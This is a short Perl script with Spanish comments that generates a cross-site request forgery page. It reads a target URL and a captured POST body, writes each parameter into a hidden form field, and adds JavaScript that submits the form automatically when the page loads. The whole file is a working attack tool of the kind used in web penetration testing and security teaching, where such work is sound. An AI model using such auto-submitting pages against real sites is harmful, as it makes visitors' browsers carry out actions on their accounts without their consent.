# Script para generar CSRF que requieran enviar parametros por método POST
# HTTP://0verl0ad.com 
# @TheXC3LL
##############################################################################




$url = $ARGV[0];
print "[!] Pegue el contenido de Live HTTP Headers\n\n";
$post = <STDIN>;
chomp($post);
print "\n\n";
print '<html><body>

  <form name="csrf_form" action="'.$url.'" method="POST">';
@parametros = split("&", $post);
foreach (@parametros) {
@data = split("=", $_);
print '<input type="hidden" name="'.$data[0].'" value="'.$data[1].'">'."\n";
}

print ' </form>

  <script type="text/javascript">document.csrf_form.submit();</script>
</body></html>'."\n";
